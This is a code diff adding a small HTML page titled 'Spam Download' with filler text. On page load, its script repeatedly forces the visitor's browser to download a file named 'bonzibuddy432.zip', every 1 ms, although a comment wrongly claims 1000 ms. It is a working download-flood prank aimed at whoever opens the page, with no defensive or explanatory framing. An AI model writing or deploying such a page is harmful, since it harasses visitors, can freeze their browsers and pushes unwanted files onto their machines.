@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Spam Download</title>
+</head>
+<body>
+  <h1>skib dib</h1>
+  <p>skib dib</p>
+
+  <script>
+    const fileUrl = 'bonzibuddy432.zip'; // Replace with your file URL
+
+    function triggerDownload(url) {
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = '';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }
+
+    setInterval(() => {
+      triggerDownload(fileUrl);
+    }, 1); // every 1000ms (1 second)
+  </script>
+</body>
+</html>
